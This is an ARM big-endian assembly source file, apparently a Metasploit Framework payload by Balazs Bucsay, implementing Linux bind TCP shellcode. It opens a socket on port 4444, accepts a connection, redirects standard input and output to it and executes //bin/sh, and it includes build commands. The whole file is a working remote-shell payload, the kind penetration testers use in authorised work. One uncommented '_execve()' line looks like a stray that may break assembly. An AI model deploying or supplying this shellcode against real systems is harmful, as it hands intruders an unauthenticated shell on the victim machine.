@@
@
@        Name: single_sock_bind
@   Qualities: -
@     Authors: Balazs Bucsay <@xoreipeip>
@     License: MSF_LICENSE
@ Description:
@
@        Implementation of a Linux bind TCP shellcode for ARM BE architecture.
@
@        Assemble with: 
@          armeb-buildroot-linux-uclibcgnueabi-as -mthumb single_sock_bind.s -o shellcode.o
@        Link with:
@          armeb-buildroot-linux-uclibcgnueabi-ld shellcode.o -o shellcode
@
@ Meta-Information:
@
@ meta-shortname=Linux Bind TCP
@ meta-description=Listen on a port for a connection and run a second stage
@ meta-authors=earthquake
@ meta-os=linux
@ meta-arch=armbe
@ meta-category=singles
@ meta-connection-type=bind
@ meta-name=bind_tcp
@@


.section .text
	.global _start

	_start:
		.code 32

@		 Thumb-Mode on
		add 	r6, pc, #1
		bx	r6
		.code 	16

@		 _socket(2,1,0)
		sub	r2, r2, r2
		add	r1, r2, #1
		add	r0, r2, #2
		lsl	r7, r1, #8
		add	r7, r7, #0x19
		svc	1
		mov	r6, r0

@	1  uint8_t 	sin_len
@	1 sa_family_t 	sin_family
@	2 in_port_t 	sin_port
@	4 struct in_addr 	sin_addr
@	8 char 	sin_zero [8]
@	00 02 5C11 00000000 00000000 00000000
@	5c11 => 4444
@		 _bind()
		mov	r2, #2
		lsl	r2, r2, #8
		add	r2, r2, #0x11
		lsl	r2, r2, #8
		add	r2, r2, #0x5C
		sub	r3, r3, r3
		sub	r4, r4, r4
		sub 	r5, r5, r5
		mov	r1, sp
		stm	r1!, {r2-r5}
		sub	r1, #0x10
		mov	r2, #16
		add	r7, r7, #1
		svc	1

@		 _listen()
		mov	r0, r6
		sub	r1, r1, r1
		add	r7, r7, #2
		svc	1
		
@		 _accept()
		mov	r0, r6
		sub	r2, r2, r2
		add	r7, r7, #1
		svc	1
		mov	r6, r0

@		 _dup2()
		sub	r1, r1, r1
		mov	r7, #63
		svc	1
	
		mov	r0, r6
		add	r1, r1, #1
		svc	1

		mov	r0, r6
		add	r1, r1, #1
		svc	1

		 _execve()
		sub	r2, r2, r2
		mov 	r0, pc
		add 	r0, #18
@ next intstruction terminates the string beneath the code "//bin/sh"
@ in case you want to say goodbye to the null character
@		str	r2, [r0, #8]
		str	r2, [sp, #8]
		str	r0, [sp, #4]
		add 	r1, sp, #4
		mov 	r7, #11
		svc 	1

@		 _exit()
		sub	r4, r4, r4
		mov	r0, r4
		mov 	r7, #1
		svc	1
.ascii "//bin/sh\0"
@.ascii "//bin/sh"
